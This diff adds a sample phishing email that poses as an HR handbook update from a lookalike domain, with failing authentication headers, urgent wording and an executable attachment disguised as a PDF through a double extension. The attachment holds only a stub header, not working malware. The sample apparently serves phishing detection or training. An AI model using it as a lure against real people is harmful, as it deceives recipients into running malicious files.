@@ -1,0 +1,32 @@
+From: HR Department <hr@company-updates.com>
+Reply-To: hr@company-updates.com
+To: employees@company.com
+Subject: Updated Employee Handbook - Please Review
+Date: Thu, 20 Feb 2025 09:00:00 -0500
+Message-ID: <handbook2025@company-updates.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="attachboundary"
+Authentication-Results: mx.company.com; spf=softfail smtp.mailfrom=company-updates.com; dkim=none; dmarc=none
+Received: from smtp.company-updates.com (smtp.company-updates.com [62.102.148.68]) by mx.company.com with ESMTP; Thu, 20 Feb 2025 09:00:08 -0500
+Received: from webmail ([62.102.148.68]) by smtp.company-updates.com; Thu, 20 Feb 2025 09:00:05 -0500
+
+--attachboundary
+Content-Type: text/plain; charset="utf-8"
+
+Hello Team,
+
+Please find attached the updated employee handbook for 2025. All employees are required to review and acknowledge the changes.
+
+The document contains important updates to our security policy that require your immediate action.
+
+Thank you,
+HR Department
+
+--attachboundary
+Content-Type: application/pdf; name="Employee_Handbook_2025.pdf.exe"
+Content-Disposition: attachment; filename="Employee_Handbook_2025.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAA=
+
+--attachboundary--
